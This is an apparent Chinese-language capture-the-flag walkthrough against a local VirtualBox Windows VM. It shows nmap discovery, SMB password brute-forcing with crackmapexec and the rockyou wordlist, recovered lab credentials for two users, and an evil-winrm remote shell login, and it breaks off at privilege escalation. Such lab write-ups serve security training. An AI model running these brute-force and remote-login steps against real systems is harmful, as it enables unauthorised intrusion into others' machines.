# 信息搜集

主机发现

```
┌──(kali㉿kali)-[~]
└─$ nmap -sn 192.168.21.0/24
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-18 01:00 EST
Nmap scan report for 192.168.21.6
Host is up (0.00011s latency).
MAC Address: 08:00:27:61:E6:D2 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.21.7
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 2.13 seconds
```

端口扫描

```
┌──(kali㉿kali)-[~]
└─$ nmap 192.168.21.6 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-18 01:10 EST
Nmap scan report for 192.168.21.6
Host is up (0.00025s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE
80/tcp   open  http
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
5985/tcp open  wsman
MAC Address: 08:00:27:61:E6:D2 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 10.47 seconds
```

# 漏洞利用

看一下80端口

```
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.21.6
Hey bro,
You asked for an easy Windows VM, enjoy it.

- nica
```

拿到一个nica用户名，对smb进行爆破

```
┌──(kali㉿kali)-[~]
└─$ crackmapexec smb 192.168.21.6 -u nica -p /usr/share/wordlists/rockyou.txt
SMB         192.168.21.6    445    WIN-IURF14RBVGV  [+] WIN-IURF14RBVGV\nica:hardcore
```

登录一下

```
┌──(kali㉿kali)-[~]
└─$ evil-winrm -i 192.168.21.6 -u nica -p hardcore
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline          
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                     
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\nica\Documents> whoami
win-iurf14rbvgv\nica

# 提权

查看有哪些用户

```
*Evil-WinRM* PS C:\Users\nica> net user

Cuentas de usuario de \\

-------------------------------------------------------------------------------
Administrador            akanksha                 DefaultAccount
Invitado                 nica                     WDAGUtilityAccount
El comando se ha completado con uno o m s errores.
```

尝试爆破一下akanksha密码

```
┌──(kali㉿kali)-[~]
└─$ crackmapexec smb 192.168.21.6 -u akanksha -p /usr/share/wordlists/rockyou.txt
SMB         192.168.21.6    445    WIN-IURF14RBVGV  [+] WIN-IURF14RBVGV\akanksha:sweetgirl
```

